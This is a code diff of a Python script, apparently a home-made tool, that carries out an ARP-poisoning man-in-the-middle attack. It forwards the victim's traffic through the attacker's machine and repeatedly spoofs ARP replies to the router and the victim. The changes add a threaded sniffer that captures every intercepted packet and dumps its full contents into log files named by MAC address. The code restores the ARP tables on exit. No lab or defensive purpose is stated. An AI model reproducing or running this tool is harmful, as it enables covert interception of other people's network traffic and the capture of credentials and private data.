@@ -10,6 +10,84 @@ import sys
 from contextlib import contextmanager
 import threading
 
+def sniff(count=0, store=1, offline=None, prn = None, lfilter=None, L2socket=None, timeout=None, stopperTimeout=None, stopper = None, *arg, **karg):
+    """Sniff packets
+sniff([count=0,] [prn=None,] [store=1,] [offline=None,] [lfilter=None,] + L2ListenSocket args) -> list of packets
+
+  count: number of packets to capture. 0 means infinity
+  store: wether to store sniffed packets or discard them
+    prn: function to apply to each packet. If something is returned,
+         it is displayed. Ex:
+         ex: prn = lambda x: x.summary()
+lfilter: python function applied to each packet to determine
+         if further action may be done
+         ex: lfilter = lambda x: x.haslayer(Padding)
+offline: pcap file to read packets from, instead of sniffing them
+timeout: stop sniffing after a given time (default: None)
+stopperTimeout: break the select to check the returned value of 
+         stopper() and stop sniffing if needed (select timeout)
+stopper: function returning true or false to stop the sniffing process
+L2socket: use the provided L2socket
+    """
+    c = 0
+
+    if offline is None:
+        if L2socket is None:
+            L2socket = conf.L2listen
+        s = L2socket(type=ETH_P_ALL, *arg, **karg)
+    else:
+        s = PcapReader(offline)
+
+    lst = []
+    if timeout is not None:
+        stoptime = time.time()+timeout
+    remain = None
+
+    if stopperTimeout is not None:
+        stopperStoptime = time.time()+stopperTimeout
+    remainStopper = None
+    while 1:
+        try:
+            if timeout is not None:
+                remain = stoptime-time.time()
+                if remain <= 0:
+                    break
+
+            if stopperTimeout is not None:
+                remainStopper = stopperStoptime-time.time()
+                if remainStopper <=0:
+                    if stopper and stopper():
+                        break
+                    stopperStoptime = time.time()+stopperTimeout
+                    remainStopper = stopperStoptime-time.time()
+
+                sel = select([s],[],[],remainStopper)
+                if s not in sel[0]:
+                    if stopper and stopper():
+                        break
+            else:
+                sel = select([s],[],[],remain)
+
+            if s in sel[0]:
+                p = s.recv(MTU)
+                if p is None:
+                    break
+                if lfilter and not lfilter(p):
+                    continue
+                if store:
+                    lst.append(p)
+                c += 1
+                if prn:
+                    r = prn(p)
+                    if r is not None:
+                        print r
+                if count > 0 and c >= count:
+                    break
+        except KeyboardInterrupt:
+            break
+    s.close()
+    return plist.PacketList(lst,"Sniffed")
+
 def myExit(status):
     print " > HDM exit"
     exit(status)
@@ -52,40 +130,44 @@ def poison(routerIP, victimIP, routerMAC, victimMAC):
 def restore(routerIP, victimIP, routerMAC, victimMAC):
     send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3, verbose=0)
     send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3, verbose=0)
-    print ""
-    print " > network defaults restored"
+    print "\r > network defaults restored"
     myExit(0)
 
 def test(pkt):
-    print pkt.summary()
     # data = [method for method in dir(pkt) if callable(getattr(pkt, method))]
     # for call in data:
     #     print call
     # pkt.show()
-    mac = pkt.sprintf("%Ether.src%")
-    fileName = "./logs/" + mac.replace(':', '_')
-    logFile = open(fileName, 'a+')
-    logFile.write(''.join(("  ", time.strftime("%H:%M:%S"), "  ", time.strftime("%d/%m/%Y"))))
-    logFile.write('\n')
-    with stdout_redirected(logFile):
-        pkt.show()
-    logFile.write('\n')
-    logFile.close()
+    pass
 
 class Logger(threading.Thread):
     def __init__(self):
-        threading.Thread.__init__(self)
-        self.run = False
+        self.canRun = False
+        super(Logger, self).__init__()
+
+    def stopper(self):
+        return not self.canRun
+
+    def run(self):
+        self.canRun = True
+        sniff(prn=self.parsePacket, store=0, stopperTimeout=1, stopper=self.stopper)
 
     def parsePacket(self, pkt):
-        print "WTF"
+        print pkt.summary()
+        mac = pkt.sprintf("%Ether.src%")
+        fileName = "./logs/" + mac.replace(':', '_')
+        logFile = open(fileName, 'a+')
+        Time = ''.join(("  ", time.strftime("%H:%M:%S"), "  ", time.strftime("%d/%m/%Y")))
+        logFile.write(Time) # and Date
+        logFile.write('\n')
+        with stdout_redirected(logFile):
+            pkt.show()
+        logFile.write('\n')
+        logFile.close()
 
     def stop(self):
-        self.run = False
-
-    def start(self):
-        while self.run:
-            sniff(prn=self.parsePacket, store=0) # neznau kak v prn poslat clasovuu funktsiu
+        self.canRun = False
+        print "STOPING"
 
 def main(args):
     print " > HDM start"
@@ -109,15 +191,17 @@ def main(args):
     with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
         ipf.write('1\n')
     def signal_handler(signal, frame):
+        print ""
+        log.stop(); # stop thread
         with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
             ipf.write('0\n')
         restore(routerIP, victimIP, routerMAC, victimMAC)
     signal.signal(signal.SIGINT, signal_handler)
 
-    # log = Logger() #not working yet
+    log = Logger()
+    log.start() # Log thread start
     print " > poisoning in progress"
     while 1:
         poison(routerIP, victimIP, routerMAC, victimMAC)
         time.sleep(1.5)
-        sniff(prn=test, store=0) # logger 
 main(parse_args())
